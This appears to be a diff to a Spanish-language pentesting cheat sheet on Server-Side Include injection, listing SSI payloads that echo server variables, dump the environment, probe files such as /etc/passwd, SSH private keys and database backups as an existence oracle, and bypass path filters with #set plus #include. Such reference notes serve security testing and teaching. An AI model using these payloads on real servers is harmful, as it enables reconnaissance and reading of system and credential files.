@@ -21,29 +21,19 @@ linked:
 
 ## `#echo` Environment Variables
 
-| **Variable** | **Payload** | **Info extraída** |
-|:---:|:---:|:---:|
-| Date local | `<!--#echo var="DATE_LOCAL" -->` | Server fecha (PoC). |
-| Date GMT | `<!--#echo var="DATE_GMT" -->` | UTC time. |
-| Document name | `<!--#echo var="DOCUMENT_NAME" -->` | Filename del .shtml. |
-| Document URI | `<!--#echo var="DOCUMENT_URI" -->` | URI del archivo. |
-| Document root | `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot abs path. |
-| Last modified | `<!--#echo var="LAST_MODIFIED" -->` | mtime del archivo actual. |
-| Server software | `<!--#echo var="SERVER_SOFTWARE" -->` | Apache/IIS version. |
-| Server name | `<!--#echo var="SERVER_NAME" -->` | Hostname. |
-| Server protocol | `<!--#echo var="SERVER_PROTOCOL" -->` | HTTP/1.1. |
-| Server port | `<!--#echo var="SERVER_PORT" -->` | 80/443. |
-| Request method | `<!--#echo var="REQUEST_METHOD" -->` | GET/POST. |
-| Request URI | `<!--#echo var="REQUEST_URI" -->` | Full URL con query. |
-| Script filename | `<!--#echo var="SCRIPT_FILENAME" -->` | Abs path del script. |
-| Remote address | `<!--#echo var="REMOTE_ADDR" -->` | Client IP. |
-| Remote user | `<!--#echo var="REMOTE_USER" -->` | Auth HTTP user. |
-| User-Agent | `<!--#echo var="HTTP_USER_AGENT" -->` | UA string. |
-| Cookie | `<!--#echo var="HTTP_COOKIE" -->` | Cookies enviadas. |
-| Referer | `<!--#echo var="HTTP_REFERER" -->` | Referer header. |
-| Path info | `<!--#echo var="PATH_INFO" -->` | Extra path. |
-| Query string | `<!--#echo var="QUERY_STRING" -->` | Raw query. |
-| Custom var (set first) | `<!--#set var="x" value="hello" --><!--#echo var="x" -->` | Variables definidas. |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|---|---|---|
+| `<!--#echo var="DATE_LOCAL" -->` | Fecha del server | PoC / confirmar SSI activo |
+| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot absoluto | Base para LFI/traversal |
+| `<!--#echo var="SERVER_SOFTWARE" -->` | Versión de Apache/IIS | Lookup de CVEs |
+| `<!--#echo var="SCRIPT_FILENAME" -->` | Path absoluto del script actual | Layout del filesystem |
+| `<!--#echo var="REMOTE_USER" -->` | Usuario de Basic Auth | Si hay auth HTTP |
+| `<!--#echo var="REMOTE_ADDR" -->` | IP del cliente | Self-recon |
+| `<!--#echo var="HTTP_COOKIE" -->` | Cookies enviadas | Self-recon |
+| `<!--#echo var="HTTP_USER_AGENT" -->` | User-Agent del cliente | Reflexión |
+| `<!--#echo var="QUERY_STRING" -->` | Query string crudo | Reflexión |
+| `<!--#set var="x" value="hello" --><!--#echo var="x" -->` | Define y muestra una var | Confirmar que `#set` funciona |
+
 ^ssi-info-echo
 
 ---
@@ -51,22 +41,14 @@ linked:
 ## `#fsize` y `#flastmod` (Filesystem Enum)
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| File size | `<!--#fsize file="/etc/passwd" -->` | Size en bytes/KB/MB. |
-| File last modified | `<!--#flastmod file="/etc/passwd" -->` | Timestamp. |
-| Existence probe | If error → file NOT exists/readable | Existence oracle. |
-| Bulk enum filesystem | Loop multiple file paths | Enumeration. |
-| Identify backup files | `.bak`, `.old`, `.swp` | OSINT. |
-| Identify log files | `/var/log/*` | Standard. |
-| Identify config files | `/etc/*`, `/var/www/*` | Discovery. |
-| Identify SSH keys | `/home/*/.ssh/*` | Sensitive. |
-| Without leaking content | Useful when `#include` blocked | Defense bypass. |
-| Combine con timing | Slow read = exists, fast 404 = no | Timing oracle. |
-| `#config sizefmt` | Customize size format | UI adjust. |
-| `#config timefmt` | Customize time format | UI adjust. |
-| Static list iteration | Manual loop with multiple `#fsize` calls | Bulk. |
-| Error message default | `[an error occurred while processing this directive]` | Standard error. |
-| Custom error message | `<!--#config errmsg="ERROR" -->` | Cleaner output. |
+|---|---|---|
+| `<!--#fsize file="/etc/passwd" -->` | Tamaño del archivo en bytes | Confirmar existencia + lectura |
+| `<!--#flastmod file="/etc/passwd" -->` | Última modificación (timestamp) | Pista de actividad |
+| `<!--#fsize file="/root/.ssh/id_rsa" -->` | Tamaño; error = no legible | Oráculo de existencia sin leak |
+| `<!--#fsize file="/var/backups/db.sql" -->` | Tamaño del backup | Localizar archivos jugosos |
+| `<!--#config sizefmt="bytes" -->` | Tamaño en bytes exactos | Output limpio para `#fsize` |
+| `<!--#config errmsg="ERROR" -->` | Mensaje de error custom | Diferenciar existe / no existe |
+
 ^ssi-info-fsize
 
 ### Filesystem enum sin leakear contenido
@@ -85,24 +67,17 @@ linked:
 
 ---
 
-## `#printenv` y `#config`
+## `#printenv`, `#set` y `#config`
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Print all env vars | `<!--#printenv -->` | Full dump. |
-| Set custom variable | `<!--#set var="x" value="hello" -->` | Define local var. |
-| Set with reference | `<!--#set var="path" value="$DOCUMENT_ROOT/admin" -->` | Var interpolation. |
-| Echo defined var | `<!--#echo var="x" -->` | Display set var. |
-| Config size format | `<!--#config sizefmt="bytes" -->` | Affects fsize output. |
-| Config size format abbrev | `<!--#config sizefmt="abbrev" -->` | Default. |
-| Config time format | `<!--#config timefmt="%Y-%m-%d %H:%M" -->` | Custom strftime. |
-| Config error message | `<!--#config errmsg="custom error" -->` | Replace default. |
-| Conditional flow | `<!--#if expr="..." --><!--#endif -->` | Branching (Apache). |
-| Else branch | `<!--#else -->` | Within if. |
-| Elif branch | `<!--#elif expr="..." -->` | Multi-branch. |
-| Endif | `<!--#endif -->` | Close if. |
-| Variable comparison | `<!--#if expr="$REMOTE_USER = admin" -->` | Conditional logic. |
-| Combine con set + include | `<!--#set var="p" value="/etc/passwd" --><!--#include file="$p" -->` | Filter bypass. |
+|---|---|---|
+| `<!--#printenv -->` | Dump de TODAS las env vars | Recon completo de una |
+| `<!--#set var="x" value="hello" -->` | Define una var local | Base para concat/bypass |
+| `<!--#set var="path" value="$DOCUMENT_ROOT/admin" -->` | Var con interpolación de otra | Armar paths dinámicos |
+| `<!--#config timefmt="%Y-%m-%d %H:%M" -->` | Formato de fecha custom (strftime) | Output controlado |
+| `<!--#if expr="$REMOTE_USER = admin" --> ... <!--#endif -->` | Lógica condicional | Branching / oráculo (Apache) |
+| `<!--#set var="p" value="/etc/passwd" --><!--#include file="$p" -->` | Include vía variable | Bypass de filtro sobre el path |
+
 ^ssi-info-printenv
 
 ### Combine printenv + post-processing
